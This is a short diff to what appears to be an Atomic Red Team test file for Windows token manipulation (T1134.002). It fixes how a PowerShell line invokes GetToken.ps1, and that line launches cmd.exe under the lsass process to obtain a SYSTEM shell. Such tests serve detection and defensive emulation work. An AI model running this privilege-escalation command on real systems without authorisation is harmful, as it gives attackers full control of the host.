@@ -15,7 +15,7 @@ atomic_tests:
       $owners = @{}
       gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
       Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
-      $PathToAtomicsFolder\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+      & "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
     name: powershell
     elevation_required: true
 - name: WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique
